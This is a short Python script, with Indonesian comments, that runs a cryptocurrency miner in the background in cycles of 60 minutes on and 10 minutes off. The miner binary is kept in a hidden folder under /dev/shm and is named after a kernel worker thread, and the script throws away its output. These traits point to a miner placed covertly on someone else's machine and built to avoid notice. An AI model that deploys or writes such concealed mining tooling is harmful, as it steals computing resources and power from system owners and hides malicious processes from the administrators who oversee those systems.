import os
import time
import sys
import signal

# CONFIG
MINER_PATH = "/dev/shm/.cache/kworker_u16_2"  # Lokasi miner
MINER_NAME = "kworker_u16_2"  # Nama miner buat kill
MINING_TIME = 3600  # 60 menit
REST_TIME = 600  # 10 menit

def is_miner_running():
    """Cek apakah miner sudah berjalan"""
    check = os.popen(f"pgrep -f {MINER_NAME}").read().strip()
    return check != ""

def kill_miner():
    os.system(f"pkill -f {MINER_NAME}")

def start_miner():
    if is_miner_running():
        print("⚠️ Miner sudah jalan, gak perlu start ulang!")
        return
    print("🚀 Jalanin miner...")
    command = f"nohup {MINER_PATH} > /dev/null 2>&1 &"
    os.system(command)
    time.sleep(5)

def main():
    while True:
        start_miner()
        time.sleep(MINING_TIME)
        kill_miner()
        time.sleep(REST_TIME)

def sigint_handler(sig, frame):
    kill_miner()
    sys.exit(0)

signal.signal(signal.SIGINT, sigint_handler)

if __name__ == "__main__":
    main()
